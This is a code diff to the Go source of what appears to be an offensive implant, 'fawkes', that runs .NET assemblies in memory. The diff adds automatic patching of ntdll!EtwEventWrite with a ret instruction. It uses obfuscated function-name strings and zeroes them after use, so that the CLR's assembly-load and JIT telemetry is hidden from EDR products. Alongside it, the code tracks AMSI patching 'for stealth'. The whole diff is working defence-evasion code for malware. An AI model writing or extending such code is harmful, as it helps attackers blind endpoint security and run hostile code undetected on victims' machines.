@@ -36,6 +36,7 @@ import (
 	"sync"
 	"time"
 
+	"fawkes/pkg/obfuscate"
 	"fawkes/pkg/structs"
 
 	"github.com/Ne0nd0g/go-clr"
@@ -46,6 +47,7 @@ var (
 	runtimeHost   *clr.ICORRuntimeHost
 	clrStarted    bool
 	amsiPatched   bool // tracks whether AMSI was patched via start-clr
+	etwPatched    bool // tracks whether ETW was patched (auto_patch, start-clr, or auto)
 )
 
 // ExecuteNETAssembly is a shared helper that executes a .NET assembly in memory
@@ -82,6 +84,23 @@ func ExecuteNETAssembly(assemblyBytes []byte, args []string) (string, error) {
 		sb.WriteString("[!] WARNING: AMSI not patched — run 'start-clr' with Autopatch for stealth\n")
 	}
 	assemblyMutex.Unlock()
+
+	// Auto-patch ETW if not already done — .NET Framework CLR emits Assembly.Load
+	// and JIT events through ntdll!EtwEventWrite, visible to EDRs.
+	if !etwPatched {
+		ntdll := obfuscate.NtdllDll()
+		defer obfuscate.Zero(ntdll)
+		etwFunc := obfuscate.EtwEventWrite()
+		defer obfuscate.Zero(etwFunc)
+
+		if _, err := PerformRetPatch(ntdll, etwFunc); err != nil {
+			if !strings.Contains(err.Error(), "already patched") {
+				sb.WriteString(fmt.Sprintf("[-] ETW auto-patch warning: %v\n", err))
+			}
+		} else {
+			etwPatched = true
+		}
+	}
 
 	// Load assembly
 	assemblyMutex.Lock()
@@ -240,6 +259,19 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		output.WriteString("[!] For best results, run 'start-clr' with Autopatch first.\n")
 	}
 	assemblyMutex.Unlock()
+
+	// Auto-patch ETW before loading assembly — CLR emits Assembly.Load events
+	if !etwPatched {
+		ntdll := obfuscate.NtdllDll()
+		defer obfuscate.Zero(ntdll)
+		etwFunc := obfuscate.EtwEventWrite()
+		defer obfuscate.Zero(etwFunc)
+
+		if _, patchErr := PerformRetPatch(ntdll, etwFunc); patchErr == nil {
+			etwPatched = true
+			output.WriteString("[+] ETW auto-patched (CLR telemetry silenced)\n")
+		}
+	}
 
 	// Step 1: Load the assembly (Merlin approach)
 	output.WriteString("[*] Loading assembly into CLR...\n")
